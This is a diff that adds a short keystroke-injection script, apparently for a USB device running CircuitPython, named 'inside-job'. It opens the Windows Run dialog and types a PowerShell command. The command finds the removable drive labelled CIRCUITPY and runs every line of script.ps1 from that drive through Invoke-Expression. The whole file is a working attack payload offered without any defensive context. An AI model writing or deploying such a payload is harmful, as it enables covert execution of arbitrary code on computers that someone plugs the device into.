@@ -1,0 +1,5 @@
+REM inside-job
+GUI r
+DELAY 200
+STRING cmd /k PowerShell.exe -Command "$f=gwmi Win32_Volume -Filter ('DriveType={0}' -f [int][System.IO.DriveType]::Removable) | ?{$_.Label -eq 'CIRCUITPY' } | %{$_.DriveLetter};Get-Content -Encoding UTF8 $f\script.ps1 | % {Invoke-Expression $_}; exit"
+ENTER
